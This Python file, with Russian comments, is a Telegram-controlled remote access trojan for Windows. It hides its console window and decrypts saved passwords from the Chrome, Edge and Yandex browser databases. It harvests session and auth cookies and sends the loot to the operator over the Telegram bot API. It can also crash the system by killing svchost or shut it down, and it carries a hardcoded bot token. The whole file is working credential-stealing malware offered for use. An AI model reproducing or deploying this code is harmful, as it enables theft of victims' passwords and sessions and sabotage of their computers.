# bot.py (FIXED: stealth + steal Chrome/Edge + autoload test + /start)
import telebot
import subprocess
import ctypes
import os
import win32crypt
import sqlite3
import shutil
from threading import Thread
import time
import browser_cookie3
import json

BOT_TOKEN = "7956448113:AAFvweSNt8e4OmGWPolHP1Fl9O4y5-Ek8bk"
bot = telebot.TeleBot(BOT_TOKEN)

# --- СКРЫТИЕ ОКНА ---
def hide():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# --- ФЕЙК БСОД ---
def bsod_fake():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    except: pass

# --- РЕАЛЬНЫЙ БСОД (убивает svchost) ---
def bsod_real():
    subprocess.call("taskkill /f /im svchost.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

# --- ВОРОВСТВО ПАРОЛЕЙ + КУКИ ---
def steal_all():
    result = ["=== ПАРОЛИ ==="]
    # --- ПАРОЛИ ИЗ БРАУЗЕРОВ ---
    paths = [
        os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data',
        os.environ['USERPROFILE'] + r'\AppData\Local\Microsoft\Edge\User Data\Default\Login Data',
        os.environ['USERPROFILE'] + r'\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data'
    ]
    for db_path in paths:
        if not os.path.exists(db_path): continue
        try:
            tmp_db = "tmp_logins.db"
            shutil.copy2(db_path, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                try:
                    pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                    result.append(f"[+] {row[0]} | {row[1]} | {pwd}")
                except: continue
            conn.close()
            os.remove(tmp_db)
        except: pass

    # --- КУКИ ---
    result.append("\n=== КУКИ ===")
    try:
        cookies = browser_cookie3.chrome()  # или edge()
        for c in cookies:
            if 'session' in c.name.lower() or 'auth' in c.name.lower():
                result.append(f"{c.domain} | {c.name} = {c.value}")
    except: result.append("куки не вышло")

    return "\n".join(result) if len(result) > 2 else "пусто"

# --- КОМАНДЫ ---
@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "бот жив\n/off\n/fakebsod\n/realbsod\n/explorer\n/steal")

@bot.message_handler(commands=['off'])
def off(m):
    bot.reply_to(m, "вырубаю")
    subprocess.call("shutdown /s /t 0", shell=True)

@bot.message_handler(commands=['fakebsod'])
def fake(m):
    bot.reply_to(m, "фейк бсод")
    Thread(target=bsod_fake).start()

@bot.message_handler(commands=['realbsod'])
def real(m):
    bot.reply_to(m, "реальный бсод")
    Thread(target=bsod_real).start()

@bot.message_handler(commands=['explorer'])
def exp(m):
    bot.reply_to(m, "проводник")
    subprocess.Popen("explorer.exe")

@bot.message_handler(commands=['steal'])
def steal(m):
    bot.reply_to(m, "ворую...")
    data = steal_all()
    with open("loot.txt", "w", encoding="utf-8") as f:
        f.write(data)
    try:
        bot.send_document(m.chat.id, open("loot.txt", "rb"))
    except:
        bot.reply_to(m, data[:3000])
    os.remove("loot.txt")

# --- ПОЛЛИНГ ---
def run():
    hide()
    while True:
        try:
            bot.polling(none_stop=True, timeout=20)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    run()
